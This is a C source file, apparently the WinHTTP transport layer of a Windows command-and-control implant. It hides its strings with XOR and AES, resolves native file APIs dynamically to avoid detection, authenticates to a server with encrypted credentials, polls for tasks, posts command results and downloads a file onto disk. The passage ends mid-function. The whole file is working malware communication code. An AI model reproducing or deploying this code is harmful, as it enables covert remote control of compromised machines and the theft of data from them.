#include "transport_winhttp.h"
#include "base.h"

#define STATUS_SUCCESS          0x00000000
#define OBJ_CASE_INSENSITIVE    0x00000040L

// https://ntdoc.m417z.com/ntstatus
typedef _Return_type_success_(return >= 0) LONG NTSTATUS;

// https://ntdoc.m417z.com/unicode_string
typedef struct _UNICODE_STRING
{
    USHORT  Length;
    USHORT  MaximumLength;
    PWCH    Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://ntdoc.m417z.com/rtlinitunicodestring
FORCEINLINE VOID RtlInitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_z_ PCWSTR SourceString
    )
{
    if (SourceString)
        DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
    else
        DestinationString->MaximumLength = DestinationString->Length = 0;

    DestinationString->Buffer = (PWCH)SourceString;
}

// https://ntdoc.m417z.com/object_attributes
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID           SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://ntdoc.m417z.com/initializeobjectattributes
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

// https://ntdoc.m417z.com/io_status_block
typedef struct _IO_STATUS_BLOCK
{
    union
    {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR    Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

// https://ntdoc.m417z.com/pio_apc_routine
typedef VOID (NTAPI *PIO_APC_ROUTINE)(
    PVOID            ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG            Reserved
);

// https://ntdoc.m417z.com/ntcreatefile
typedef NTSTATUS ( NTAPI * NtCreateFile_t ) (
    PHANDLE             FileHandle,
    ACCESS_MASK         DesiredAccess,
    POBJECT_ATTRIBUTES  ObjectAttributes,
    PIO_STATUS_BLOCK    IoStatusBlock,
    PLARGE_INTEGER      AllocationSize,
    ULONG               FileAttributes,
    ULONG               ShareAccess,
    ULONG               CreateDisposition,
    ULONG               CreateOptions,
    PVOID               EaBuffer,
    ULONG               EaLength
);

// https://ntdoc.m417z.com/ntwritefile
typedef NTSTATUS ( NTAPI * NtWriteFile_t ) (
    HANDLE              FileHandle,
    HANDLE              Event,
    PIO_APC_ROUTINE     ApcRoutine,
    PVOID               ApcContext,
    PIO_STATUS_BLOCK    IoStatusBlock,
    PVOID               Buffer,
    ULONG               Length,
    PLARGE_INTEGER      ByteOffset,
    PULONG              Key
);

wchar_t cookie[225];
LPSTR bufferResponse;
char key[] = { 0xf6, 0x6b, 0x5b, 0x68, 0x37, 0xd7, 0x3e, 0x85, 0x57, 0xcc, 0x8e, 0x73, 0x7a, 0xa9, 0x34, 0xae };

void download( char * encryptedResource, size_t encResSize )
{
    HANDLE hFile          = NULL;
    DWORD bytesToRead     = 0;
    DWORD bytesRead       = 0;
    BOOL bResults         = FALSE;
    HINTERNET   hSession  = NULL,
                hConnect  = NULL,
                hRequest  = NULL;
    NTSTATUS            status;
    OBJECT_ATTRIBUTES   object;
    IO_STATUS_BLOCK     statusBlock;
    UNICODE_STRING      unicodePath;

    char xorkey[]        = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sNTDLL[]        = { 0xf, 0x16, 0x7, 0x8, 0x9, 0x46 };
    char sFilePath[]     = { 0x1d, 0x7d, 0x7c, 0x18, 0x19, 0x5, 0x7d, 0x6d, 0x65, 0x5a, 0x5a, 0x25, 0x2d, 0x34, 0x37, 0x19, 0x15, 0x3e, 0x42, 0x46, 0x56, 0x59, 0x72, 0x70, 0x1f, 0x31, 0x36, 0x23, 0x35, 0x7, 0x6, 0x1d, 0x50, 0x2d, 0x2e, 0x79, 0x34, 0x2a, 0x34, 0x33, 0x1f, 0x56, 0x5f, 0x58, 0x7b, 0x66, 0x7, 0x5, 0x11, 0x7, 0x47 };
    char sNtCreateFile[] = { 0xf, 0x36, 0x0, 0x36, 0x20, 0x27, 0x33, 0x54, 0x74, 0x5a, 0x58, 0x24, 0x42 };
    char sNtWriteFile[]  = { 0xf, 0x36, 0x14, 0x36, 0x2c, 0x32, 0x22, 0x77, 0x5b, 0x5f, 0x51, 0x41 };

    XORDecrypt( (char *) sNTDLL, sizeof( sNTDLL ), (char *) xorkey, sizeof( xorkey ) );

    HMODULE hNtdll = GetModuleHandle( sNTDLL );
    
    // Use WinHttpOpen to obtain a session handle
    hSession = open_winhttp();

    // Specify an HTTP server
    hConnect = connect_winhttp( hSession );

    // Create an HTTP request handle, GET request
    hRequest = open_request_winhttp_get( hConnect, encryptedResource, encResSize );

    // Add a request header (cookie)
    bResults = add_header_winhttp( hRequest, cookie, -1L, WINHTTP_ADDREQ_FLAG_ADD );

    // Send a GET request
    bResults = send_request_winhttp_get( hRequest );

    // End the request
    bResults = receive_response_winhttp( hRequest );

    if ( bResults ) {
        //hFile = CreateFileW( L"C:\\Users\\administrator\\Desktop\\port.dll", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );

        XORDecrypt( (char *) sFilePath, sizeof( sFilePath ), (char *) xorkey, sizeof( xorkey ) );
        wchar_t * wideFilePath = convertCharArrayToLPCWSTR( sFilePath );
        
        // Initializes a counted Unicode string
        RtlInitUnicodeString( 
            &unicodePath,       // The buffer for a counted Unicode string to be initialized
            wideFilePath        // Unicode string to initialize the counted string
        );
        
        // Initializes the OBJECT_ATTRIBUTES structure
        InitializeObjectAttributes( 
            &object,                // Pointer to the OBJECT_ATTRIBUTES structure
            &unicodePath,           // Pointer to the Unicode string
            OBJ_CASE_INSENSITIVE,   // A case-insensitive comparison is used when matching the ObjectName parameter against the names of existing objects
            NULL,                   // The ObjectName is a fully qualified object name, so RootDirectory is NULL
            NULL                    // Optional security descriptor
        );

        XORDecrypt( (char *) sNtCreateFile, sizeof( sNtCreateFile ), (char *) xorkey, sizeof( xorkey ) );
        XORDecrypt( (char *) sNtWriteFile, sizeof( sNtWriteFile ), (char *) xorkey, sizeof( xorkey ) );
        
        NtCreateFile_t pNtCreateFile = (NtCreateFile_t) GetProcAddress( hNtdll, sNtCreateFile );
        if ( pNtCreateFile == NULL ) {
            printf( "[-] Error in NtCreateFile pointer!\n" );
        }

        // Creates a new file, or opens an existing file
        status = pNtCreateFile( 
            &hFile,                         // Pointer to the file handle
            FILE_GENERIC_WRITE,             // Generic write flags
            &object,                        // Pointer to the OBJECT_ATTRIBUTES structure
            &statusBlock,                   // Pointer to a variable that receives the final completion status
            0,                              // No initial allocation size for the file
            FILE_ATTRIBUTE_NORMAL,          // Default file attributes
            FILE_SHARE_WRITE,               // The file can be opened for write access by other thread's calls to NtCreateFile
            FILE_OVERWRITE_IF,              // If the file already exists, open it and overwrite it
            FILE_RANDOM_ACCESS |            // Accesses to the file can be random
            FILE_NON_DIRECTORY_FILE |       // The file being opened must not be a directory file or this call fails
            FILE_SYNCHRONOUS_IO_NONALERT,   // All operations on the file are performed synchronously
            NULL,                           // Pointer to an EA buffer
            0                               // Length of the EA buffer
        );

        if ( status == STATUS_SUCCESS ) {
            do {
                // Check for available data
                if ( !query_data_winhttp ( hRequest, &bytesToRead )) {
                    printf( "Error in WinHttpQueryDataAvailable.\n" );
                }

                if ( bytesToRead > 0 ) {
                    // Allocate space for the buffer
                    bufferResponse = malloc( bytesToRead + 1 );
                    if ( !bufferResponse ) {
                        printf( "Out of memory\n" );
                        break; // Exit the loop if memory allocation failed
                    }

                    ZeroMemory( bufferResponse, bytesToRead + 1 );

                    // Read the data
                    if ( !read_data_winhttp( hRequest, (LPVOID) bufferResponse, bytesToRead, &bytesRead )) {
                        printf( "Error in WinHttpReadData.\n" );
                    } else {
                        // WriteFile( hFile, bufferResponse, bytesToRead, bytesDownloaded, NULL );
                        
                        NtWriteFile_t pNtWriteFile = (NtWriteFile_t) GetProcAddress( hNtdll, sNtWriteFile );
                        if ( pNtWriteFile == NULL ) {
                            printf( "[-] Error in NtWriteFile pointer!\n" );
                        }

                        // Writes data to an open file
                        status = pNtWriteFile(
                            hFile,              // Handle to the file object
                            NULL,               // Optional handle to event object that must be NULL
                            NULL,               // Reserved parameter
                            NULL,               // Reserved parameter
                            &statusBlock,       // Pointer to a variable that receives the final completion status
                            bufferResponse,     // Pointer to a buffer that contains the data to write to the file
                            bytesToRead,        // The size of the buffer
                            NULL,               // NULL since using FILE_SYNCHRONOUS_IO_NONALERT in NtCreateFile
                            NULL                // NULL for device and intermediate drivers
                        );

                        if ( status != STATUS_SUCCESS ) {
                            printf( "[-] Error in NtWriteFile function!\n" );
                        }
                    }

                }
            } while ( bytesToRead > 0 );
        } else {
            printf( "[-] Error in NtCreateFile function!\n" );
        }
    }

    // Close any open handles
    close_request_winhttp( hRequest );
    close_conenction_winhttp( hConnect );
    close_session_handle( hSession );
}

void get_task( char * encryptedResource, size_t encResSize )
{
    DWORD bytesToRead    = 0;
    DWORD bytesRead      = 0;
    BOOL bResults        = FALSE;
    HINTERNET   hSession = NULL,
                hConnect = NULL,
                hRequest = NULL;
    
    // Use WinHttpOpen to obtain a session handle
    hSession = open_winhttp();

    // Specify an HTTP server
    hConnect = connect_winhttp( hSession );

    // Create an HTTP request handle, GET request
    hRequest = open_request_winhttp_get( hConnect, encryptedResource, encResSize );

    // Add a request header (cookie)
    bResults = add_header_winhttp( hRequest, cookie, -1L, WINHTTP_ADDREQ_FLAG_ADD );

    // Send a GET request
    bResults = send_request_winhttp_get( hRequest );

    // End the request
    bResults = receive_response_winhttp( hRequest );

    if ( bResults ) {
        do {
            // Check for available data
            if ( !query_data_winhttp ( hRequest, &bytesToRead )) {
                printf( "Error in WinHttpQueryDataAvailable.\n" );
            }

            if ( bytesToRead > 0 ) {
                // Allocate space for the buffer
                bufferResponse = malloc( bytesToRead + 1 );
                if ( !bufferResponse ) {
                    printf( "Out of memory\n" );
                    break; // Exit the loop if memory allocation failed
                }

                ZeroMemory( bufferResponse, bytesToRead + 1 );

                // Read the data
                if ( !read_data_winhttp( hRequest, (LPVOID) bufferResponse, bytesToRead, &bytesRead )) {
                    printf( "Error in WinHttpReadData.\n" );
                } else {
                    // Print response
                    //printf( "%s", bufferResponse );
                }

                // Free the memory allocated to the buffer
                // free( bufferResponse );
            }
        } while ( bytesToRead > 0 );
    }

    // Close any open handles
    close_request_winhttp( hRequest );
    close_conenction_winhttp( hConnect );
    close_session_handle( hSession );
}

void post_login( char * encryptedResource, size_t encResSize )
{
    LPSTR buffer;
    DWORD dwOptions      = 0;
    DWORD dwSize         = 0;
    DWORD bytesToRead    = 0;
    DWORD bytesRead      = 0;
    BOOL bResults        = FALSE;
    LPVOID lpOutBuffer   = NULL;
    HINTERNET   hSession = NULL,
                hConnect = NULL,
                hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle
    hSession = open_winhttp();

    // Specify an HTTP server
    hConnect = connect_winhttp( hSession );

    // Create an HTTP request handle, POST request
    hRequest = open_request_winhttp_post( hConnect, encryptedResource, encResSize );

    // Disable redirects
    dwOptions = WINHTTP_DISABLE_REDIRECTS;
    bResults = set_option_winhttp( hRequest, WINHTTP_OPTION_DISABLE_FEATURE, &dwOptions, sizeof( dwOptions ) );

    // Send a POST request
    bResults = login_request_winhttp_post( hRequest );

    // End the request
    bResults = receive_response_winhttp( hRequest );

    // Retrieve the cookie
    if ( bResults ) {
        // Obtain the size of the Set-Cookie header
        // WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_SET_COOKIE, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX );
        query_headers_winhttp (hRequest, WINHTTP_QUERY_SET_COOKIE, NULL, &dwSize );

        if ( GetLastError() == ERROR_INSUFFICIENT_BUFFER ) {
            lpOutBuffer = malloc( dwSize ); 

            // Retrieve the header
            // bResults = WinHttpQueryHeaders( hRequest, WINHTTP_QUERY_SET_COOKIE, WINHTTP_HEADER_NAME_BY_INDEX, lpOutBuffer, &dwSize, WINHTTP_NO_HEADER_INDEX );
            bResults = query_headers_winhttp (hRequest, WINHTTP_QUERY_SET_COOKIE, lpOutBuffer, &dwSize );
            
            cookieProcess( lpOutBuffer );
        }

        // printf( "Cookie: %S\n", cookie );

        free( lpOutBuffer );
    }
    
    if ( bResults ) {
        do {
            // Check for available data
            if ( !query_data_winhttp ( hRequest, &bytesToRead )) {
                printf( "Error in WinHttpQueryDataAvailable.\n" );
            }

            if ( bytesToRead > 0 ) {
                // Allocate space for the buffer
                buffer = malloc( bytesToRead + 1 );
                if ( !buffer ) {
                    printf( "Out of memory\n" );
                    break; // Exit the loop if memory allocation failed
                }

                ZeroMemory( buffer, bytesToRead + 1 );

                // Read the data
                if ( !read_data_winhttp( hRequest, (LPVOID) buffer, bytesToRead, &bytesRead )) {
                    printf( "Error in WinHttpReadData.\n" );
                } else {
                    // Print response
                    // printf( "%s", buffer );
                }

                // Free the memory allocated to the buffer
                free( buffer );
                buffer = NULL;
            }
        } while ( bytesToRead > 0 );
    }

    // Close any open handles
    close_request_winhttp( hRequest );
    close_conenction_winhttp( hConnect );
    close_session_handle( hSession );
}

void post_command_results( char * encryptedResource, size_t encResSize, char * jsonData )
{
    LPSTR buffer;
    DWORD bytesToRead    = 0;
    DWORD bytesRead      = 0;
    BOOL bResults        = FALSE;
    HINTERNET   hSession = NULL,
                hConnect = NULL,
                hRequest = NULL;

    // Use WinHttpOpen to obtain a session handle
    hSession = open_winhttp();

    // Specify an HTTP server
    hConnect = connect_winhttp( hSession );

    // Create an HTTP request handle, POST request
    hRequest = open_request_winhttp_post( hConnect, encryptedResource, encResSize );

    // Add a request header (cookie)
    bResults = add_header_winhttp( hRequest, cookie, -1L, WINHTTP_ADDREQ_FLAG_ADD );

    // Send a POST request
    bResults = command_request_winhttp_post( hRequest, jsonData );

    // End the request
    bResults = receive_response_winhttp( hRequest );

    if ( bResults ) {
        do {
            // Check for available data
            if ( !query_data_winhttp ( hRequest, &bytesToRead )) {
                printf( "Error in WinHttpQueryDataAvailable.\n" );
            }

            if ( bytesToRead > 0 ) {
                // Allocate space for the buffer
                buffer = malloc( bytesToRead + 1 );
                if ( !buffer ) {
                    printf( "Out of memory\n" );
                    break; // Exit the loop if memory allocation failed
                }

                ZeroMemory( buffer, bytesToRead + 1 );

                // Read the data
                if ( !read_data_winhttp( hRequest, (LPVOID) buffer, bytesToRead, &bytesRead )) {
                    printf( "Error in WinHttpReadData.\n" );
                } else {
                    // Print response
                    printf( "%s", buffer );
                }

                // Free the memory allocated to the buffer
                free( buffer );
                buffer = NULL;
            }
        } while ( bytesToRead > 0 );
    }

    // Close any open handles
    close_request_winhttp( hRequest );
    close_conenction_winhttp( hConnect );
    close_session_handle( hSession );
}

/* !
 * @brief Process the cookie value (lpOutBuffer) and remove last 18 characters ("Cookie: session=<cookie>") by setting a nullbyte
 * @param lpOutBuffer    -> Buffer where cookie is stored
 */
void cookieProcess( LPVOID buffer ) {
    
    wchar_t * cookieCopy = (wchar_t *) buffer;
    size_t cookieLength = wcslen( cookieCopy );
    
    if ( cookieLength >= 18 ) {
        cookieCopy[ cookieLength - 18 ] = L'\0';
    }

    wcscpy( cookie, L"Cookie: " );
    // Concatenate Cookie string with actual cookie to have: "Cookie: session=<cookie>"
    wcscat( cookie, cookieCopy );
}

/* !
 * @brief Use WinHttpOpen to obtain a session handle
 * @param pszAgentW       -> User-Agent
 * @param dwAccessType    -> Proxy options
 * @param pszProxyW       -> Proxy server name
 * @param pszProxyBypassW -> List of host names that should not be routed through the proxy when WINHTTP_ACCESS_TYPE_NAMED_PROXY is set
 * @param dwFlags         -> Flag options (async, secure)
 * @return Valid session handle if successful, otherwise NULL
 */
HINTERNET open_winhttp()
{
    char encryptedUserAgent[]   = { 0x9e, 0xda, 0x68, 0x8b, 0x87, 0x88, 0x17, 0xa4, 0xd9, 0x55, 0xa2, 0x94, 0x1b, 0xfc, 0x48, 0x1f, 0x53, 0x5b, 0xc3, 0xcb, 0x6b, 0x8c, 0x44, 0x67, 0xfc, 0xe1, 0xf4, 0xaa, 0x78, 0xa7, 0x4d, 0xc3, 0xdc, 0x64, 0x74, 0x14, 0x9d, 0x40, 0xc1, 0xc, 0x11, 0x6a, 0x18, 0x30, 0x5a, 0x36, 0x85, 0xe2, 0x8b, 0xb5, 0xd1, 0xcd, 0x49, 0xf8, 0xee, 0xfe, 0xff, 0x14, 0xe6, 0x69, 0x3, 0x92, 0x26, 0x3a, 0x6, 0x45, 0x66, 0x79, 0x81, 0xee, 0x67, 0x22, 0x22, 0x20, 0xb0, 0xa3, 0x3d, 0x5, 0xcc, 0xe1, 0x8a, 0x19, 0xcf, 0x90, 0x13, 0x83, 0x99, 0xd7, 0x39, 0x25, 0xab, 0xa0, 0x82, 0x62, 0xf0, 0xa1, 0xa3, 0xc9, 0xf1, 0xe8, 0x7c, 0x3d, 0xc4, 0xa4, 0x75, 0xb5, 0xee, 0xa7, 0xf1, 0xc5, 0xd7, 0xad, 0x1d, 0x86, 0xae, 0xc1, 0x7e, 0xf2, 0xb8, 0xa7, 0xe2, 0xfe, 0xe2, 0xbc, 0xa4, 0xb4, 0x3, 0x3f };
    char encryptedProxy[]       = { 0xbd, 0x43, 0xf0, 0xaf, 0xfb, 0x7f, 0x28, 0x6a, 0x14, 0x2c, 0x63, 0xd4, 0xe3, 0xe8, 0x76, 0x59, 0xbb, 0xb6, 0xbb, 0xff, 0x8e, 0xed, 0xdc, 0xe5, 0x5f, 0xb7, 0x0, 0x5b, 0xb9, 0x9b, 0x5, 0xa9 };
    char encryptedProxyBypass[] = { 0xfa, 0xda, 0xbc, 0x3f, 0xdc, 0x65, 0xd9, 0x67, 0xff, 0xe3, 0xe1, 0xd6, 0x1b, 0x43, 0xd8, 0x8b };

    // Decrypt Proxy Bypass
    AESDecrypt( (char *) encryptedProxyBypass, sizeof( encryptedProxyBypass ), (char *) key, sizeof( key ) );
    // Convert Proxy Bypass to wide string 
    wchar_t * wideProxyBypass = convertCharArrayToLPCWSTR( encryptedProxyBypass );
    
    // Decrypt User-Agent
    AESDecrypt( (char *) encryptedUserAgent, sizeof( encryptedUserAgent ), (char *) key, sizeof( key ) );
    // Convert User-Agent to wide string 
    wchar_t * wideUserAgent = convertCharArrayToLPCWSTR( encryptedUserAgent );

    // Decrypt proxy server name
    AESDecrypt( (char *) encryptedProxy, sizeof( encryptedProxy ), (char *) key, sizeof( key ) );
    // Convert proxy server name to wide string 
    wchar_t * wideProxy = convertCharArrayToLPCWSTR( encryptedProxy );
    
    // Use WinHttpOpen to obtain a session handle
    HINTERNET hSes = WinHttpOpen( wideUserAgent,                    // L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
                                  WINHTTP_ACCESS_TYPE_NAMED_PROXY,  // Pass request through proxy
                                  wideProxy,                        // L"http://localhost:4444"
                                  wideProxyBypass,                  // L"<local>"
                                  0 );                              // Asynchronous

    if ( hSes == NULL ) {
        printf( "[-] Invalid session handle\n" );
        return NULL;
    }

    return hSes;
}

/* !
 * @brief Specify an HTTP server
 * @param hSession          -> Session handle by WinHttpOpen
 * @param pswzServerName    -> Host name of HTTP server
 * @param nServerPort       -> Server port
 * @param dwReserved        -> Reserved parameter
 * @return Valid connection handle if successful, otherwise NULL
 */
HINTERNET connect_winhttp( HINTERNET hSes )
{
    char encryptedServer[] = { 0xda, 0x92, 0xff, 0xaa, 0x40, 0xec, 0x12, 0xd0, 0x70, 0x50, 0x39, 0x53, 0x12, 0xc4, 0x2f, 0xd, 0x62, 0x5f, 0x68, 0x58, 0x7c, 0x63, 0x78, 0x5d, 0xef, 0x1b, 0x15, 0xb7, 0xee, 0xe0, 0x5, 0x9d, 0xaa, 0x4f, 0xa2, 0xf6, 0x8, 0x58, 0x2f, 0x49, 0x62, 0xc2, 0x20, 0x82, 0x75, 0x2d, 0xd6, 0xa4, 0x62, 0x11, 0x8c, 0x88, 0x69, 0x2a, 0x77, 0xc8, 0x6, 0xb4, 0x7, 0xd8, 0xfd, 0x9a, 0x3d, 0xf8 };
    
    // Decrypt server name
    AESDecrypt( (char *) encryptedServer, sizeof( encryptedServer ), (char *) key, sizeof( key ) );
    // Convert server name to wide string 
    wchar_t * wideServer = convertCharArrayToLPCWSTR( encryptedServer );
    
    // Specify an HTTP server
    HINTERNET hCon = WinHttpConnect( hSes,          // Session handle hSes
                                     wideServer,    // Server name (wide string)
                                     8000,          // Server port, if HTTPS in use then INTERNET_DEFAULT_HTTPS_PORT
                                     0 );           // Reserved

    if ( hCon == NULL ) {
        printf( "[-] Invalid connection handle to HTTP session\n" );
        return NULL;
    }

    return hCon;
}

/* ! 
 * @brief Create an HTTP request handle
 * @param hConnect          -> Connection handle by WinHttpConnect
 * @param pwszVerb          -> HTTP verb (GET in this case)
 * @param pwszObjectName    -> Target resource (path eg /login)
 * @param pwszVersion       -> HTTP version (default HTTP/1.1)
 * @param pwszReferrer      -> Referring documents (WINHTTP_NO_REFERER: no referring documents)
 * @param *ppwszAcceptTypes -> Media types accepted by the client
 * @param dwFlags           -> Internet flag options
 */
HINTERNET open_request_winhttp_get( HINTERNET hCon, char * encryptedResource, size_t encResSize )
{
    char encryptedGet[] = { 0x52, 0x88, 0xce, 0x1f, 0x54, 0x9e, 0x12, 0xb6, 0x71, 0xc0, 0xaf, 0xef, 0x21, 0xf6, 0xc0, 0x14 };
    
    // Decrypt GET method
    AESDecrypt( (char *) encryptedGet, sizeof( encryptedGet ), (char *) key, sizeof( key ) );
    // Convert GET method to wide string
    wchar_t * wideGet = convertCharArrayToLPCWSTR( encryptedGet );

    // Decrypt resource
    AESDecrypt( (char *) encryptedResource, encResSize, (char *) key, sizeof( key ) );
    // Convert resource to wide string
    wchar_t * wideResource = convertCharArrayToLPCWSTR( encryptedResource );
    
    // Create an HTTP request handle
    HINTERNET hReq = WinHttpOpenRequest( hCon,                          // Connection handle hCon
                                         wideGet,                       // GET method (wide string)
                                         wideResource,                  // Target resource
                                         NULL,                          // HTTP/1.1
                                         WINHTTP_NO_REFERER,            // No referring documents
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,  // No types are accepted by the client
                                         0 );                           // Internet flags, if HTTPS in use then WINHTTP_FLAG_SECURE

    if ( hReq == NULL ) {
        printf( "[-] Invalid HTTP request handle\n" );
        return NULL;
    }

    return hReq;
}

/* ! 
 * @brief Create an HTTP request handle
 * @param hConnect          -> Connection handle by WinHttpConnect
 * @param pwszVerb          -> HTTP verb (POST in this case)
 * @param pwszObjectName    -> Target resource (path eg /login)
 * @param pwszVersion       -> HTTP version (default HTTP/1.1)
 * @param pwszReferrer      -> Referring documents (WINHTTP_NO_REFERER: no referring documents)
 * @param *ppwszAcceptTypes -> Media types accepted by the client
 * @param dwFlags           -> Internet flag options
 */
HINTERNET open_request_winhttp_post( HINTERNET hCon, char * encryptedResource, size_t encResSize )
{
    char encryptedPost[] = { 0x76, 0x0, 0x56, 0xf6, 0x51, 0xe3, 0x2f, 0x8a, 0x19, 0x73, 0x23, 0x40, 0xc, 0xd9, 0x1e, 0x78 };
    
    // Decrypt POST method
    AESDecrypt( (char *) encryptedPost, sizeof( encryptedPost ), (char *) key, sizeof( key ) );
    // Convert POST method to wide string
    wchar_t * widePost = convertCharArrayToLPCWSTR( encryptedPost );

    // Decrypt resource
    AESDecrypt( (char *) encryptedResource, encResSize, (char *) key, sizeof( key ) );
    // Convert resource to wide string
    wchar_t * wideResource = convertCharArrayToLPCWSTR( encryptedResource );
    
    // Create an HTTP request handle
    HINTERNET hReq = WinHttpOpenRequest( hCon,                          // Connection handle hCon
                                         widePost,                      // POST method (wide string)
                                         wideResource,                  // Target resource
                                         NULL,                          // HTTP/1.1
                                         WINHTTP_NO_REFERER,            // No referring documents
                                         WINHTTP_DEFAULT_ACCEPT_TYPES,  // No types are accepted by the client
                                         0 );                           // Internet flags, if HTTPS in use then WINHTTP_FLAG_SECURE

    if ( hReq == NULL ) {
        printf( "[-] Invalid HTTP request handle\n" );
        return NULL;
    }

    return hReq;
}

/* ! 
 * @brief Set an Internet option (eg disable automatic redirection)
 * @param hInternet         -> Either Session or Request handle
 * @param dwOption          -> Option flag
 * @param lpBuffer          -> Buffer with option value
 * @param dwBufferLength    -> Length of buffer
 * @return TRUE if successful, otherwise FALSE
 */
BOOL set_option_winhttp( HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength )
{
    return WinHttpSetOption( hInternet, dwOption, lpBuffer, dwBufferLength );
}

/* !
 * @brief Add a requets header
 * @param hRequest          -> Request handle by WinHttpOpenRequest
 * @param lpszHeaders       -> Header to append to request
 * @param dwHeadersLength   -> Header length
 * @param dwModifiers       -> Flags for function, like add or replace the header
 * @return TRUE if successful, otherwise FALSE
*/
BOOL add_header_winhttp( HINTERNET hReq, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers )
{
    return WinHttpAddRequestHeaders( hReq,              // Request handle 
                                     lpszHeaders,       // Cookie
                                     dwHeadersLength,   // Cookie size (-1L)
                                     dwModifiers );     // WINHTTP_ADDREQ_FLAG_ADD
}

/* !
 * @brief Send a request
 * @param hRequest          -> Request handle by WinHttpOpenRequest
 * @param lpszHeaders       -> Additional headers
 * @param dwHeadersLength   -> Length of additional headers 
 * @param lpOptional        -> Optional data to send
 * @param dwOptionalLength  -> Length of optional data
 * @param dwTotalLength     -> Length of total bytes sent
 * @param dwContext         -> Value to callback functions
 * @return TRUE if successful, otherwise FALSE
 */
BOOL send_request_winhttp_get( HINTERNET hReq )
{
    // Send a request
    return WinHttpSendRequest( hReq,                            // Request handle hReq
                               WINHTTP_NO_ADDITIONAL_HEADERS,   // No additional headers
                               0,                               // Length of additional headers 
                               WINHTTP_NO_REQUEST_DATA,         // No optional data to send
                               0,                               // Length of optional data
                               0,                               // Length of total bytes sent
                               0 );                             // Value to callback functions
}

/* !
 * @brief Send a request (login)
 * @param hRequest          -> Request handle by WinHttpOpenRequest
 * @param lpszHeaders       -> Additional headers
 * @param dwHeadersLength   -> Length of additional headers 
 * @param lpOptional        -> Optional data to send
 * @param dwOptionalLength  -> Length of optional data
 * @param dwTotalLength     -> Length of total bytes sent
 * @param dwContext         -> Value to callback functions
 * @return TRUE if successful, otherwise FALSE
 */
BOOL login_request_winhttp_post( HINTERNET hReq )
{
    // Content-Type: application/x-www-form-urlencoded
    char encryptedContentType[] = { 0x1f, 0xaa, 0xb5, 0x9c, 0x45, 0xea, 0xac, 0x37, 0xcd, 0x81, 0x89, 0x1e, 0x1a, 0xa0, 0xee, 0x46, 0xb7, 0xc9, 0xa5, 0xa2, 0x91, 0xd0, 0xe6, 0x21, 0x6b, 0xb7, 0xf9, 0x42, 0x46, 0x55, 0x54, 0xe4, 0x4d, 0x87, 0x92, 0xbf, 0x7a, 0x58, 0x4b, 0x3f, 0x8d, 0xa, 0x31, 0xed, 0x28, 0x5c, 0x17, 0xa2, 0xe0, 0x58, 0xbc, 0xb5, 0x31, 0xfb, 0xc4, 0xbe, 0xfd, 0xcc, 0x74, 0x61, 0x62, 0x58, 0x75, 0x93 };
    char encryptedCreds[]       = { 0xd8, 0x22, 0x9e, 0xb7, 0x93, 0x88, 0x98, 0xfd, 0xa4, 0x57, 0xda, 0x59, 0x5c, 0x59, 0x5a, 0x1d, 0x36, 0x7, 0xef, 0xc3, 0x92, 0x7d, 0xe1, 0x8, 0x7b, 0x5f, 0xaf, 0xf9, 0x6f, 0x22, 0xb2, 0xa5, 0xa1, 0xca, 0x57, 0x8, 0x6b, 0x6c, 0x62, 0x4c, 0x76, 0x32, 0x10, 0x54, 0xd8, 0x6c, 0xfe, 0xcb, 0x2a, 0x85, 0xb5, 0x92, 0x57, 0x61, 0x56, 0xd9, 0x92, 0x2f, 0xfd, 0x5f, 0x5f, 0x7f, 0xcb, 0x8c };

    // Decrypt Content-Type
    AESDecrypt( (char *) encryptedContentType, sizeof( encryptedContentType ), (char *) key, sizeof( key ) );
    // Convert Content-Type to wide string
    wchar_t * wideContentType = convertCharArrayToLPCWSTR( encryptedContentType );
    
    // Decrypt credentials
    AESDecrypt( (char *) encryptedCreds, sizeof( encryptedCreds ), (char *) key, sizeof( key ) );

    // Send a request
    return WinHttpSendRequest( hReq,                                                // Request handle hReq
                               wideContentType,                                     // L"Content-Type: application/x-www-form-urlencoded"
                               -1L,                                                 // lpszHeaders is not NULL
                               encryptedCreds,                                      // Credentials for authentication 
                               strlen( encryptedCreds ),                            // Length of the credentials
                               strlen( encryptedCreds ),                            // Length of total data, in this case same as length of credentials
                               0 );                                                 // Value to callback functions
}

/* !
 * @brief Send a request (command results)
 * @param hRequest          -> Request handle by WinHttpOpenRequest
 * @param lpszHeaders       -> Additional headers
 * @param dwHeadersLength   -> Length of additional headers 
 * @param lpOptional        -> Optional data to send
 * @param dwOptionalLength  -> Length of optional data
 * @param dwTotalLength     -> Length of total bytes sent
 * @param dwContext         -> Value to callback functions
 * @return TRUE if successful, otherwise FALSE
 */
BOOL command_request_winhttp_post( HINTERNET hReq, char * jsonData )
{
    // Content-Type: application/json
